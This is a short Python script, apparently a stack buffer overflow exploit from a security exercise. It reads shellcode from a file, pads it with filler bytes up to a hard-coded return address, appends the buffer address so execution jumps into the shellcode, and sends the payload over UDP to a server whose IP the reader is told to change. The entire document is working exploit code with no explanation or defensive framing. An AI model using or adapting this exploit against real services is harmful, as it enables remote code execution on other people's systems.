#!/usr/bin/env python3
import os
import sys
import struct
import socket

# Addresses
addr_buffer = 0x7fffffffec80
addr_retaddr = 0x7fffffffed08

# Read the shellcode
with open("shellcode.bin", "rb") as shellfile:
    shellcode = shellfile.read()

# Padding the shellcode up to the return address
shellcode += b"A" * ((addr_retaddr - addr_buffer) - len(shellcode))

# Append the address of the shellcode
shellcode += struct.pack("<Q", addr_buffer)

# UDP server details
udp_ip = "127.0.0.1"  # Change to the server's IP address
udp_port = 8080       # Server port

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send the shellcode to the UDP server
sock.sendto(shellcode, (udp_ip, udp_port))
print(f"Shellcode sent to {udp_ip}:{udp_port}")

# Close the socket
sock.close()
